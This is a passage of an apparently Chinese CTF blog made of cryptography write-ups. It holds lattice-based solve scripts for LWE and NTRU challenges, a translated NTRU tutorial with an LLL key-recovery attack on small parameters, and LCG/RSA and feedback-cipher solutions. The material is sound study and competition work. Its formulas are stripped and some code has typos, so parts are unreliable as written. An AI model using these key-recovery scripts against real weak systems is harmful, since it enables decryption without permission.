根据某个大佬的博客, 组数越多越好, 所以基本上题目给了多少组就用上多少组 通过对构造出来的格子进行规约得到good basis然后用最近平面算出再解方程即可得到 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): ''' Yet another method to solve apprCVP, using a given good basis. INPUT: * \"L\" -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * \"w\" -- a target vector to approach to. OUTPUT: * \"v\" -- a approximate closest vector. Quoted from \"An Introduction to Mathematical Cryptography\": In both theory and practice, Babai's closest plane algorithm seems to yield better results than Babai's closest vertex algorithm. ''' G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wq = 8934325385505568130914092337950620590424921674062792756625169144539462888362199042365894202712873706261308891694743761726859424971637596576879385466842113L = [...]n = 32Q = [[0 for _ in range(2*n)] for _ in range(2*n)]R = [0 for _ in range(2*n)]LL = [[0 for _ in range(n)] for _ in range(2*n)]for i in range(2*n): for j in range(n): LL[i][j] = L[i][0][j] M = Matrix(LL).transpose()for i in range(2*n): for j in range(2*n): if i == j: Q[i][j] = qfor i in range(2*n): R[i] = L[i][1]R = vector(R)L = Matrix(Q).stack(Matrix(M))lattice = IntegerLattice(L, lll_reduce=True)closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)FLAG = Matrix(Zmod(q), M.transpose())flag = FLAG.solve_right(closest_vector)print(''.join( chr(i) for i in flag)) 2021/3/31 update 因为最近在做大学生密码挑战赛的LWE, 所以学了挺多造格子的姿势这边记录一个好用的格子, 80维的秘密向量都可以规约出来, 很牛逼 在中 我们可以把矩阵和向量看成, 所以咱们就可以构造出这么一个格子规约出来的就直接是噪音了, 有了就能解出, 不过这边还是有几个点要去注意 上面式子给出的格子并不是扔进sage里规约的格子, 真正扔进去规约的是它的转置, 也不知道是不是sage默认对行向量规约, 只能把它转置才能规约出结果, 结果也是行向量来的 格子中有一个, 其中的逆矩阵是模的逆, 有时候会出现模不能求逆的情况, 这个时候可以适当的调换中的行向量, 使得的逆存在, 但要记得向量也要跟着调换, 而且最后求到的结果也是调换之后的, 需要还原回去 暂时就这两个点了 为了写个板子供以后做题用, 我把祥云杯那道题的数据拿过来写了个exp, 贴在这边以后要用了可以过来拿. 1234567891011121314151617181920212223242526272829303132333435363738import numpy as nprow = 128col = 42p = 2129M = Matrix(list(np.load('matrix.npy')))R = vector(list(np.load('result.npy')))A1 = M[:col]A2 = M[col:]A12 = A2 * A1.inverse() % pL = Matrix([[0 for _ in range(row+1)] for _ in range(row+1)])for i in range(col): for j in range(col): if i == j: L[i,j] = 1 for i in range(row - col): for j in range(row - col): if i == j: L[i+col,j+col] = pfor i in range(row-col): for j in range(col): L[i+col,j] = A12[i,j]for i in range(row): L[i,-1] = R[i]L[-1,-1] = 1reduced = L.transpose().LLL()error = []for i in reduced[0][:-1]: error.append(-i)e = vector(error)As = R - eA = Matrix(Zmod(p),M)for i in A.solve_right(As): print(chr(i),end='')","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"LWE","slug":"LWE","permalink":"http://tearsjin.github.io/tags/LWE/"}]},{"title":"Translation of LatticeHacks","date":"2021-03-28T10:49:16.000Z","path":"2021/03/28/Translation-of-LatticeHacks/","text":"打了个比赛NTRU不会做, 翻密码爷爷的博客发现一个宝藏网站https://latticehacks.cr.yp.to虽然内容不多, 还是英语的. 这里翻译翻译也顺便学习一下. NTRU多项式Zx.&lt;x&gt; = ZZ[] 这里创建了一个Zx类, 一个Zx对象, 一个Zx对象是关于x的整系数多项式, 举个栗子: 123sage : f = Zx([3,1,4])sage : f4*x^2 + x + 3 这个多项式f是这三部分的和. 每一部分都是整数系数(分别为4,1,3) 乘(times?)上一个的次幂(为别为) 也可以将上面的例子复制黏贴进Sage源代码里 123f = Zx([3,1,4])f# output: 4*x^2 + x + 3 多项式乘法Zx类有一个把每一部分相乘并相加的内置乘法. 比如说, 乘一个, 或者是的任意次方, 不过这样也就是在移动的参数: 1234f# output: 4*x^2 + x + 3f*x# output: 4*x^3 + x^2 + 3*x 再来个例子: 12345g = Zx([2,7,1])g# output: x^2 + 7*x + 2f*g# output: 4*x^4 + 29*3^3 + 18*x^2 + 23*x + 6 循环卷积 顺便学习一下循环卷积是怎样的卷积分三种: 线性卷积, 周期卷积, 循环卷积线性卷积: 就是普通的多项式乘法循环卷积与周期卷积并没有本质区别, 循环卷积就是保留前一部分不动, 把后面的截下来加到前一部分去(就是模吧, 比如模, 对于结果来说, 就是把模成, 再加到前面去变成) 12def convolution(f,g): return (f * g)% (x^n - 1) 这个乘法就是NTRU中使用的乘法. 它就像模一个多项式乘法. 这意味着把替换成1, 把替换成, 把替换成等等 输入两个模的系数多项式和, 那么输出也会是一个次多项式, 因为次及以上的式子都被约掉了. 所以是有可能存在一些甚至是全部项的系数为0. 我们常说的系数多项式并不是说全都存在, 而是说 等等的项不存在. 例子 12345n = 3f*g# output: 4*x^4 + 29*x^3 + 18*x^2 + 23*x + 6convolution(f,g)# output: 18*x^2 + 27*x + 35 另外一个例子, 计算和次幂的卷积, 就是在旋转的系数. 1234567n = 3f# output: 4*x^2 + x + 3convolution(f,x)# output: x^2 + 3*x + 4convolution(f,x^2)# output: 3*x^2 + 4*x + 1 注意, 这里的是一个全局变量. 原文这里还有两个练习, 一个是python练习, 一个是数学练习…这里就不翻译了, 也没什么必要. Sage可以直接用R = Zx.quotient(x^n-1)生成一个加减乘运算都是的类R “cyclic convolution”(循环卷积) 或者是 “circular convolution” 这个名字来自与信号处理. 在多项式乘法中, 它叫”acyclic convolution” 模约123def balancedmod(f,q): g = list(((f[i] + q//2) %q) - q//2 for i in range(n)) return Zx(g) balancedmod()有两个输入: 一个整系数多项式和一个正整数. 输出一个也是n整系数, 并且每一个系数都. 数学家们通常定义模约的结果在 之中, 但这个函数的输出会将系数模约到之间, 更详细的说, 当是偶数的时候, 结果的范围是;当是奇数的时候, 范围是 来个例子: 12345678u = Zx([3,1,4,1,5,9])u# output: 9*x^5 + 5*x^4 + x^3 + 4*x^2 + x + 3n = 7balancedmod(u,10)# output: -x^5 - 5*x^4 + x^3 + 4*x^2 + x + 3balancedmod(u,3)# output: -x^4 + x^3 + x^2 + x 在函数内部, balancedmod()依旧使用Sage的% q操作, 这个操作的输出会在之间. 但这个函数会调整输入和输出到, 也就是取整数部分. 注意, 负数输入% q后在低级语言中往往会输出负数. 这样会泄露输入的符号(除非输入刚好是的倍数, 那么输出就会是0). 泄露符号可以导致一些严重的安全问题, Sage支持对多项式进行% p这个操作, 但是输出有时候会泄露输入的符号, 比如说: 123456789u = 314 - 159*xu % 200# output: -159*x + 114(u - 400) % 200# output: -159*x - 86(u - 600) % 200# output: -159*x + 114balancedmod(u,200)# output: 41*x - 86 d项非零的随机多项式(Random polynomials with d nonzero coefficients)123456789def randomdpoly(): assert d &lt;= n result = n*[0] for j in range(d): while True: r = randrange(n) if not result[r]: break result[r] = 1 - 2*randrange(2) return Zx(result) randomdpoly()返回一个有个非零系数(个系数为0)的次多项式. 而且每个非零的系数要么是1, 要么是-1. 来看例子(注意n和d是全局变量): 12345678n = 7d = 5f = randomdpoly()f# output: x^6 + x^5 - x^3 + x^2 - 1f = randomdpoly()f# output: -x^4 + x^3 + x^2 - x + 1 模素数的除法123def invertmodprime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f))) litf(), 把一个在环R/I中的数, 转成在R中 invertmodprime()会计算一个多项式在下的逆元. 这个函数有两个输入, 一个系数多项式以及一个素数(比如说 3). 输出一个系数多项式, 这个满足(是循环卷积, 也是一个多项式). 如果多项式不存在, 那么这个函数将报错. 举个例子: 12345678n = 7f# output: -x^4 + x^3 + x^2 - x + 1f3 = invertmodprime(f,3)f3# output: x^6 + 2*x^4 + xconvolution(f,f3)# output: 3*x^6 - 3*x^5 + 3*x^4 + 1 convolution的结果可以看成, 其中 事实上在模非素数的时候也是可能算出结果的, 但是由于invertmodprime使用了Sage中的子程序?(subroutines), 以至于该函数会没那么好的处理非素数模. 模的除法1234567def invertmodpowerof2(f,q): assert q.is_power_of(2) g = invertmodprime(f,2) while True: r = balancedmod(convolution(g,f),q) if r == 1: return g g = balancedmod(convolution(g,2 - r),q) 这个函数跟上面的invertmodprime很像, 唯一的不同是输入是, 比如 1234567n = 7q = 256f# output: -x^4 + x^3 + x^2 - x + 1fq = invertmodpowerof2(f,q)convolution(f,fq)# output: -256*x^6 + 256*x^4 - 256*x ^2 + 257 convolution的结果可以看成, 其中 这里依旧有个数学练习 NTRU 密钥生成12345678910111213def keypair(): while True: try: f = randomdpoly() f3 = invertmodprime(f,3) fq = invertmodpowerof(f,q) break except: pass g = randomdpoly() publickey = balancedmod(3 * convolution(fq,g),q) secretkey = f,f3 return publickey,secretkey keypair()会生成一个公钥h和对应的私钥f,f3. 公钥看起来就像一个随机的的系数多项式. 比如说, 如果, 那么公钥看起来就像一个7个随机的字节?(bytes): 123456n = 7d = 5q = 256publickey, secretkey = keypair()publickey# output: 54*x^6 - 40*x^5 + 90*x^4 + 101*x^3 - 108*x^2 + 80*x + 76 其中一个私钥是一个有小系数的多项式, 将与公钥卷积再能生成另外一个小系数的多项式, 也就是出现在密钥生成里的 1234567f,f3 = secretkeyf# output:-x^6 + x^5 - x^4 + x^2 + 1convolution(f, publickey)# output: 256*x^6 + 3*x^5 - 3*x^3 - 3*x^2 + 253*x - 253balancedmod(_,q)# output: 3*x^5 - 3*x^3 - 3*x^2 - 3*x + 3 用于加密的消息123def randommessage(): result = list(randrange(3) - 1 for j in range(n)) return Zx(result) 这个函数会返回一个个系数为的多项式 123456789n = 7randommessage()# output: -x^6 - x^5 + x^4randommessage()# output: x^6 + x^5 - x^4 - 1randommessage()# output: -x^4 - x^3 - x + 1randommessage()# output: -x^6 + x^4 - x^2 + 1 加密123def encrypt(message,publickey): r = randomdpoly() return balancedmod(convolution(publickey,r) + message,q) 加密函数输入一个需要加密的消息和公钥, 输出的密文为,其中是消息, 是随机的一个多项式. 例子: 123456789101112n = 7d = 5q = 256h,secretkey = keypair()h# output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5m = randommessage()m# output: -x^6 - x^4 + x^2 + 1c = encrypt(m,h)c# output: -66*x^6 + 37*x^5 + 115*x^4 - 15*x^3 - 6*x^2 - 89*x + 27 解密1234def decrypt(ciphertext,secretkey): f,f3 = secretkey a = balancedmod(convolution(ciphertext,f),q) return balancedmod(convolution(a,f3),3) 解密函数需要输入密文和私钥 这里作者测试了一下解密算法, 就知识简单的重复加完密再解密, 这部分就不写下来了. 下面这个例子就是加解密的时候函数内部的所有过程, 用来说明解密的正确性: 123456789101112131415161718192021222324252627282930n = 7d = 5q = 256h,secretkey = keypair()h# output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5m = randommessage()m# output: x^6 + x^5 - x^4 - x^3 + x - 1r = randomdpoly()r# output: -x^6 + x^5 + x^4 + x^3 - x^2f = secretkey[0]f# output: -x^6 - x^5 - x^4 - x^3 - xg3 = balancedmod(convolution(f,h),q)g3# output: -3*x^6 - 3*x^3 + 3*x^2 - 3*x - 3c = balancedmod(convolution(h,r) + m,q)c# output: -93*x^6 - 105*x^5 - 110*x^4 - 95*x^3 - 106*x^2 a = balancedmod(convolution(f,c),q)a# output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3convolution(g3,r) + convolution(f,m)# output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3balancedmod(a,3)# output: -x^4 - x^2 - xbalancedmod(convolution(f,m),3)# output: -x^4 - x^2 - x 再看看过程,所以我们有:多项式的系数都特别的小, 所以这里对系数的最大值有限制. 只有当这个限制足够小, 小到就是, 这个时候规约就是在计算, 最后再乘就能得到了 注意到解密是有可能失败的, 有一个办法避免对有效密文的解密失败就是标准化的选取, 但是攻击者仍然可以故意选择无效密文来查看解密是否可以正常进行. 所以为了安全采取额外的措施抵抗这种选择密文攻击是很重要的! 一个对参数过小的NTRU的攻击实例在下面的例子中, 参数将使用 攻击者将会从公钥入手. 我们可以计算 12345h# output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5Integers(q)(1/3)# output: 171h3 = (171 * h)%q 我们可以把看成是私钥乘. 记住, 私钥是从通过一些加减得到的. 那么对应的就是从通过一些加减得到的.下面是这些多项式: 1234567891011121314h3# output: 58*x^6 + 210*x^5 + 54*x^4 + 36*x^3 + 194*x^2 + 130*x + 87convolution(h3,x)# output: 210*x^6 + 54*x^5 + 36*x^4 + 194*x^3 + 130*x^2 + 87*x + 58convolution(h3,x^2)# output: 54*x^6 + 36*x^5 + 194*x^4 + 130*x^3 + 87*x^2 + 58*x + 210convolution(h3,x^3)# output: 36*x^6 + 194*x^5 + 130*x^4 + 87*x^3 + 58*x^2 + 210*x + 54convolution(h3,x^4)# output: 194*x^6 + 130*x^5 + 87*x^4 + 58*x^3 + 210*x^2 + 54*x + 36convolution(h3,x^5)# output: 130*x^6 + 87*x^5 + 58*x^4 + 210*x^3 + 54*x^2 + 36*x + 194convolution(h3,x^6)# output: 87*x^6 + 58*x^5 + 210*x^4 + 54*x^3 + 36*x^2 + 194*x + 130 事实上, , 可以从任意的参数通过加减得到. 这意味着可以从组合而来 最后, 连接上面的这些系数并将产生的组合写进下面的矩阵中 123456789101112131415161718192021M = Matrix(2*n)for i in range(n): M[i,i] = qfor i in range(n,2*n): M[i,i] = 1for i in range(n): for j in range(n): M[i+n,j] = convolution(h3, x^i)[j]M# output: [256 0 0 0 0 0 0 0 0 0 0 0 0 0]# output: [ 0 256 0 0 0 0 0 0 0 0 0 0 0 0]# output: [ 0 0 256 0 0 0 0 0 0 0 0 0 0 0]# output: [ 0 0 0 256 0 0 0 0 0 0 0 0 0 0]# output: [ 0 0 0 0 256 0 0 0 0 0 0 0 0 0]# output: [ 0 0 0 0 0 256 0 0 0 0 0 0 0 0]# output: [ 0 0 0 0 0 0 256 0 0 0 0 0 0 0]# output: [ 87 130 194 36 54 210 58 1 0 0 0 0 0 0]# output: [ 58 87 130 194 36 54 210 0 1 0 0 0 0 0]# output: [210 58 87 130 194 36 54 0 0 1 0 0 0 0]# output: [ 54 210 58 87 130 194 36 0 0 0 1 0 0 0]# output: [ 36 54 210 58 87 130 194 0 0 0 0 1 0 0]# output: [194 36 54 210 58 87 130 0 0 0 0 0 1 0]# output: [130 194 36 54 210 58 87 0 0 0 0 0 0 1] 然后使用LLL算法可以快速的找出行组合出来的短向量. 123456789101112131415M.LLL()# output: [ -1 -1 1 -1 1 0 0 -1 1 -1 -1 1 0 0]# output: [ 0 -1 -1 1 -1 1 0 0 -1 1 -1 -1 1 0]# output: [ 1 -1 1 -1 0 0 1 -1 1 1 -1 0 0 1]# output: [ -1 1 -1 0 0 1 1 1 1 -1 0 0 1 -1]# output: [ 1 -1 0 0 1 1 -1 1 -1 0 0 1 -1 1]# output: [ 1 1 1 1 1 1 1 1 1 1 1 1 1 1]# output: [ 0 0 1 1 -1 1 -1 0 0 1 -1 1 1 -1]# output: [ 39 -28 19 12 11 -48 -4 47 6 -31 -20 -19 36 -18]# output: [ -5 -34 -14 -3 9 -39 -43 47 54 22 1 -17 19 1]# output: [ 4 -39 28 -19 -12 -11 48 18 -47 -6 31 20 19 -36]# output: [ 9 -40 -43 -5 -32 -13 -1 -17 20 1 47 54 23 3]# output: [ -1 9 -40 -43 -5 -32 -13 3 -17 20 1 47 54 23]# output: [ 14 3 -9 40 43 4 32 -22 -3 17 -18 -1 -48 -54]# output: [ 28 -19 -12 -11 48 4 -39 -6 31 20 19 -36 18 -47] 这里详细的解释一下, 因为多项式g的系数就是由这些项的系数线性组合而来的, 矩阵M左下角那一块就是h3可能出现的系数的排列, 左上角一块是q和相乘的系数(其实就是q), 这些行向量进行线性组合的结果中, 肯定存在的系数, 而又因为的系数都是很小的, 所以利用格基规约, 可以把向量规约出来. 第一行的就是对应的, 事实上, 如果的负数那么产生的也是的负数 123456M.LLL()[0][n:]# output: (-1, 1, -1, -1, 1, 0, 0)Zx(list(_))# output: x^4 - x^3 - x^2 + x - 1f# output: -x^4 + x^3 + x^2 - x + 1 但是攻击者仍然可以解密且不考虑负数. 同样的, LLL 可以产生能够正常用于解密的和, 所以对于NTRU方案, 需要更大的参数来保证它的安全性. 自动化攻击1234567891011121314151617181920212223242526272829303132333435def attack(publickey): recip3 = lift(1/Integers(q)(3)) publickeyover3 = balancedmod(recip3 * publickey,q) M = matrix(2 * n) for i in range(n): M[i,i] = q for i in range(n): M[i+n,i+n] = 1 c = convolution(x^i,publickeyover3) for j in range(n): M[i+n,j] = c[j] M = M.LLL() for j in range(2 * n): try: f = Zx(list(M[j][n:])) f3 = invertmodprime(f,3) return (f,f3) except: pass return (f,f)n = 120q = 2^32d = 81publickey,secretkey = keypair()donald = attack(publickey)print donald[0]try: m = randommessage() c = encrypt(m,publickey) assert decrypt(c,donald) == m print 'attack successfully decrypts'except: print 'attack was unsuccessful' 这个脚本用的是Python2的sage? 真的要用来解题估计还得自己写一个","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"}]},{"title":"writeup for 2021 3月dsactf","date":"2021-03-27T11:36:57.000Z","path":"2021/03/27/writeup-for-2021-3月dsactf/","text":"orz 还是太菜了，这个比赛密码都被A穿了，我还是做不出NTRU，师傅们都说简单，多项式杀我还是详细记录一下吧，加油 0x00 crypto_threshold 是签到没错了。。。 problem12345678910111213141516171819202122232425262728293031323334353637383940414243444546import randomfrom sympy import nextprimefrom Crypto.Util.number import *from secret import flagfrom gmpy2 import gcddef lcg(seed,params): (m,c,n)=params s = seed % n while True: s = (m * s + c) % n yield s seed = getPrime(128)m = getPrime(128)c = getPrime(128)n = getPrime(129)print(m,c,n)key_stream = lcg(seed,(m,c,n))num=[]for _ in range(6): num.append(next(key_stream)) print(num)secret = next(key_stream)e = nextprime(secret)p = getPrime(1024)q = getPrime(1024)_lambda = ((p-1)*(q-1)) / gcd(p-1,q-1)flag = bytes_to_long(flag)print(_lambda)print(p*q)print(pow(flag,e,p*q)) '''# data''' analyses条件全给的LCG，直接往下推就好了。RSA, 直接求逆就是私钥了 exp123456789101112131415161718from sympy import nextprimefrom Crypto.Util.number import *from gmpy2 import invertdef lcg(seed, params): (m, c, n) = params s = seed % n return (m * s + c) % nm, c, n = (315926151576125492949520250047736865439, 204423972944032372640132172728460755543, 375402477603617093440157245062608289367)seed = 287868671713011127830359814204794790287e = nextprime(lcg(seed, (m, c, n)))_lambda = d = invert(e, lam)n = c = print(long_to_bytes(pow(c, d, n))) 0x01 FeedBack 流密码的路子，再熟悉不过了 problem12345678910111213141516171819from secret import flagfrom string import hexdigitsimport randomfrom functools import reducedef cycle(c:list,a:list)-&gt;int: return reduce(lambda x,y: x+y,map(lambda x: x[0]*x[1],zip(c,a))) def enc(m:list,k:list)-&gt;list: for i in range(len(k)*2): m.append(cycle(m[i:i+len(k)],k)) return m[len(k):]if __name__ == \"__main__\": key=[ord(random.choice(hexdigits)) for i in range(len(flag))] c=enc(list(flag),key) print(c)# data analyses简单说一下整个过程吧，key和flag的长度都是27这个仔细点看应该就可以看出来了.记这里的加密其实就是计算然后放在最后面再来看看条件，题目给了一共54个。写成矩阵就知道这54个能干什么大事情了所以这54个m已经可以解出全部的了 解出27个以后，就是题目所说的feedback了， 我们知道，前27个计算下一个，而, 可以看到这个式子里， 我们只有不知道，直接解方程或者爆破都可以解出来。解出就可以按着这个思路一路往回解，直到解出全部。 exp123456789101112131415161718192021222324# sagemathdef cycle(c,a): return reduce(lambda x,y: x+y,map(lambda x: x[0]*x[1],zip(c,a))) c = [...]A = []for i in range(27): v = c[i:i+27] A.append(v)s = vector(c[27:])A = Matrix(A)a = A.solve_left(s)c = c[:27]m = []for _ in range(27): for i in range(0xff): res = cycle([i] + c[:-1],a) if res == c[-1]: c = [i] + c[:-1] m.append(chr(i)) break''.join(m[::-1]) 0x02 son_of_NTRU 做过一样的题了，那道题还是我格的启蒙，怎么会忘呢https://xz.aliyun.com/t/7163 - 从一道CTF题初探NTRU格密码 problem123456789101112131415161718192021222324252627282930313233343536#! /bin/bash/env python3from random import randrangefrom Crypto.Util.number import *from gmpy2 import invertdef gcd(a,b): while b: a,b = b,a%b return adef generate(): p = getPrime(1024) while True: f = randrange(1,(p//2)**(0.5)) g = randrange((p//4)**(0.5),(p//2)**(0.5)) if gcd(f,p)==1 and gcd(f,g)==1: break h = (invert(f,p)*g)%p return h,p,f,gdef encrypt(m,h,p): assert m&lt;(p//4)**(0.5) r = randrange(1,(p//2)**(0.5)) c = (r*h+m)%p return ch,p,f,g = generate()from flag import flagc = encrypt(bytes_to_long(flag),h,p)print(\"h = {}\".format(h))print(\"p = {}\".format(p))print(\"c = {}\".format(c))# h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004# p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469# c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700 analyses不多说了，前面说的那个blog说的超级清楚。这道题在生成参数的时候给了一大堆条件就是为了在格基规约的时候能够把和规约出来。还有！那个同余式要参数够小才能模约去随机数。 exp123456789101112from Crypto.Util.number import long_to_bytes as l2bh = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700v1 = vector([1,h])v2 = vector([0,p])f,g = Matrix([v1,v2]).LLL()[0]f,g = abs(f),abs(g)d = int(inverse_mod(f,g))x = int((c * f) % p %g )l2b((x * d)%g) 0x03 threshold 真正的NTRU，我太菜了不知道多项式要怎么处理，去dawn_wispher爷爷的Blog学习一下，学会了再来更新3/29 俺回来了, 俺学会了, 不过这边只扔一波脚本, 具体原理可以去看我的另外一篇Translation of LatticeHacks problem1234567891011121314151617181920212223242526272829303132#make.sageimport randomflag = bytearray(\"DASCTF{********************************}\".encode())flag = list(flag)length = len(flag)N=53p=257q=28019d=18f=[1]*19+[-1]*18+[0]*16random.shuffle(f)g=[1]*18+[-1]*18+[0]*17random.shuffle(g)Q.&lt;x&gt; = Zmod(q)[]P.&lt;y&gt; = Zmod(p)[]fx=Q(f)fy=P(f)gx=Q(g)Fqx=fx.inverse_mod(x^N-1)Fpy=fy.inverse_mod(y^N-1)hx=(Fqx*gx).mod(x^N-1)r=[1]*10+[-1]*22+[0]*21random.shuffle(r)rx=Q(r)mx=Q(flag)ex=(p*rx*hx+mx).mod(x^N-1)print(ex)print(hx)#7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860#14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 6022 analysesNTRU, 参数够小就能通过格基规约求出私钥, 然后通过正常的解密流程进行解密了 这里有几个点需要注意一下: NTRU能够用来解密的私钥不止一个, 所以可能有多个私钥能够解密密文. 特别是规约之后的矩阵, 常常能规约出一大堆私钥来. 在构造格子的时候, 系数旋转的方向一定要正确, 在做这道题的时候我就因为旋转的方向反了做了一整天(我还一直以为自己解密写错了 造格子有很多方法, 这边记录一下两个 第一个格子规约出来的上面行, 每行的前一半是私钥, 后一半是随机向量第二个格子规约出来的上面行, 每行的后一半是私钥, 前一半是随机向量 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from random import *Zx.&lt;x&gt; = ZZ[]def balancedmod(f,N,q): g = list(((f[i] + q//2) %q) - q//2 for i in range(N)) return Zx(g)def convolution(f,g,N): return (f*g) % (x^N-1)def randomdpoly(d,N): assert d &lt;= N result = N*[0] for j in range(d): while True: r = randrange(N) if not result[r]: break result[r] = 1 - 2*randrange(2) return Zx(result)def invertmodprime(f,N,p): T = Zx.change_ring(Integers(p)).quotient(x^N-1) return Zx(lift(1 / T(f)))def invertmodpowerof2(f,N,q): assert q.is_power_of(2) g = invertmodprime(f,2,N) while True: r = balancedmod(convolution(g,f),q) if r == 1: return g g = balancedmod(convolution(g,2 - r),q) def randommessage(N,p): result = list(randrange(p) - 1 for j in range(N)) return Zx(result) def keypair(d,N,q,p): while True: try: f = randomdpoly(d,N) fp = invertmodprime(f,N,p) fq = invertmodpowerof2(f,N,q) break except: pass g = randomdpoly() publickey = balancedmod(p * convolution(fq,g,N),N,q) secretkey = f,fp return publickey,secretkeydef encrypt(message,publickey,N,q): r = randomdpoly(randint(N)) return balancedmod(convolution(publickey,r) + message,N,q)def decrypt(ciphertext,secretkey,N,q,p): f,fp = secretkey a = balancedmod(convolution(ciphertext,f,N),N,q) return balancedmod(convolution(a,fp,N),N,p) def balancedmod(f,N,q): g = list(((f[i] + q//2) %q) - q//2 for i in range(N)) return Zx(g)def invertmodprime(f,N,p): T = Zx.change_ring(Integers(p)).quotient(x^N-1) return Zx(lift(1 / T(f)))def convolution(f,g,N): return (f*g) % (x^N-1)N = 53q = 28019p = 257B = Matrix([[0 for _ in range(2*N)] for _ in range(2*N)])ex = ...hx = ...H = hx.list()sigma = 1_lambda = 1for i in range(N): for j in range(N): B[i+N,j] = int(H[j-i]) if i == j: B[i,j] = sigma * q B[N+i,N+j] = _lambda * 1 L = B.LLL()[1]fx = Zx(list(L[N:]))fp = invertmodprime(fx,N,p)for i in decrypt(ex,(fx,fp),N,q,p).list(): print(chr(abs(i)),end='') 这个exp顺便把一些要用到的运算也放过来了, 以后做NTRU可以用这些运算来做","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"NTRU","slug":"NTRU","permalink":"http://tearsjin.github.io/tags/NTRU/"},{"name":"Stream","slug":"Stream","permalink":"http://tearsjin.github.io/tags/Stream/"}]},{"title":"Reading notes An Introduction to Lenstra-Lenstra-Lovasz Lattice Basis Reduction Algorithm","date":"2021-03-25T07:59:45.000Z","path":"2021/03/25/Reading-notes-An-Introduction-to-Lenstra-Lenstra-Lovasz-Lattice-Basis-Reduction-Algorithm/","text":"IntroductionDefinition 1.1(Lattice). A lattice is a discrete subgroup of generated by all the integer combinations of the vectors of some basis :Theorem 1.1 (Minowski’s Theorem). Any convex, centrally symmetric body of volume contains a non-zero lattice point. is the determinant of a lattice . Definition 1.2 (Fundamental Region). A set of a lattice if its translation ,taken over all , form a partition of . Corollary 1.1.1 For any n-dimensional lattice , we have the length of shortest vector Basis Reduction​ Basis reduction is a process of reducing the basis of a lattice to a shorter basis while keeping the same. ​ There are some ways to change the basis but keep the same lattice : 1. Swap two vectors in the basis. 2. For a vector $b_i \\in B $, use $-b_i$ instead. 3. For a vector $b_i \\in B$, add a linear combination of other basis vectors to it. Basis reduction can help solving SVP, because if we can not reduce a basis anymore, the shortest basis vector should be the shortest vector of the lattice. Now we start by solving the SVP in 2-dimensional case. Definition 